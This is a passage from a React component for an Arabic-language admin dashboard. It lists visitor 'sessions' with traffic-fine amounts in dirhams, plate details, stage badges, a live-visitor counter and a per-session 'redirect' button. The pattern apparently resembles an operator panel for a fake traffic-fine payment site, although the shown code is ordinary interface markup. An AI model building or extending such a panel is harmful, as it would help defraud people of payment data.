              value: stats?.pending ?? pendingCount,
              icon: (
                <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              ),
              color: "text-yellow-600",
              bg: "bg-yellow-50",
            },
            {
              label: "زوار متصلون الآن",
              value: activeVisitors,
              icon: (
                <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0" />
                </svg>
              ),
              color: "text-purple-600",
              bg: "bg-purple-50",
            },
          ].map((stat, i) => (
            <div key={i} className="bg-white rounded-xl shadow-sm border border-gray-100 p-4 flex items-center gap-3">
              <div className={`w-12 h-12 ${stat.bg} ${stat.color} rounded-xl flex items-center justify-center flex-shrink-0`}>
                {stat.icon}
              </div>
              <div>
                <div className="text-2xl font-bold text-gray-800">{stat.value}</div>
                <div className="text-gray-500 text-xs leading-tight">{stat.label}</div>
              </div>
            </div>
          ))}
        </div>

        {/* ===== جدول الحجوزات ===== */}
        <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
          {/* رأس الجدول */}
          <div className="flex items-center justify-between px-5 py-4 border-b border-gray-100">
            <h2 className="text-gray-800 font-bold text-base">قائمة الحجوزات</h2>
            <div className="relative">
              <input
                id="srch"
                type="text"
                placeholder="بحث..."
                value={searchQuery}
                onChange={e => setSearchQuery(e.target.value)}
                className="border border-gray-200 rounded-lg px-3 py-1.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 pr-8 w-48"
              />
              <svg className="w-4 h-4 text-gray-400 absolute right-2.5 top-1/2 -translate-y-1/2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </div>
          </div>

          {sessionsQuery.isLoading ? (
            <div className="text-center py-16 text-gray-400">
              <div className="w-8 h-8 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-3" />
              جاري التحميل...
            </div>
          ) : filteredSessions.length === 0 ? (
            <div className="text-center py-16 text-gray-400">
              <svg className="w-12 h-12 mx-auto mb-3 text-gray-300" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
              </svg>
              لا توجد حجوزات
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-gray-50 border-b border-gray-100">
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">قيمة المخالفات</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">جهة إصدار اللوحة</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs hidden md:table-cell">رقم اللوحة</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs hidden md:table-cell">رمز اللوحة</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">اللوحة</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs hidden lg:table-cell">التاريخ</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">الحالة</th>
                    <th className="text-right text-gray-500 font-semibold px-4 py-3 text-xs">الإجراءات</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredSessions.map((s, idx) => (
                    <tr
                      key={s.sessionId}
                      className={`border-b border-gray-50 hover:bg-blue-50/30 transition ${idx % 2 === 0 ? "bg-white" : "bg-gray-50/30"}`}
                    >
                      {/* قيمة المخالفات */}
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-1.5">
                          <span className="text-blue-600 text-xs font-semibold whitespace-nowrap">
                            {s.totalAmount ? `${s.totalAmount} درهم` : "-"}
                          </span>
                          {s.statusRead === 0 && (
                            <span className="bg-red-500 text-white text-xs px-1 py-0.5 rounded-full leading-none">جديد</span>
                          )}
                        </div>
                      </td>

                      {/* جهة إصدار اللوحة */}
                      <td className="px-4 py-3 text-gray-700 font-medium">{s.plateSource || "-"}</td>

                      {/* رقم اللوحة */}
                      <td className="px-4 py-3 text-gray-600 hidden md:table-cell font-mono text-xs">{s.plateNumber || "-"}</td>

                      {/* رمز اللوحة */}
                      <td className="px-4 py-3 text-gray-600 hidden md:table-cell text-xs">{s.plateCode || "-"}</td>

                      {/* اللوحة */}
                      <td className="px-4 py-3">
                        <span className="bg-gray-100 text-gray-700 px-2 py-0.5 rounded font-mono text-xs">
                          {s.plateNumber || "-"}
                        </span>
                      </td>

                      {/* التاريخ */}
                      <td className="px-4 py-3 text-gray-500 text-xs hidden lg:table-cell">
                        {new Date(s.createdAt).toLocaleDateString("ar-AE")}
                      </td>

                      {/* الحالة */}
                      <td className="px-4 py-3">
                        <StageBadge stage={s.stage} />
                      </td>

                      {/* الإجراءات */}
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-1.5">
                          {/* زر تفاصيل */}
                          <button
                            onClick={() => setSelectedSession(s)}
                            className="flex items-center gap-1 bg-blue-600 hover:bg-blue-700 text-white px-2.5 py-1.5 rounded-lg text-xs font-medium transition"
                          >
                            <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                            </svg>
                            تفاصيل
                          </button>

                          {/* زر توجيه */}
                          <button
                            onClick={() => { setRedirectSession(s); setRedirectUrl(""); }}
                            className="flex items-center gap-1 bg-purple-100 hover:bg-purple-200 text-purple-700 px-2.5 py-1.5 rounded-lg text-xs font-medium transition"
                          >
                            <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7" />
                            </svg>
                            توجيه
                          </button>

                          {/* سهم توسيع */}
                          <button
                            onClick={() => setSelectedSession(s)}
                            className="w-7 h-7 bg-gray-100 hover:bg-gray-200 text-gray-500 rounded-lg flex items-center justify-center transition"
                          >
                            <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                            </svg>
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
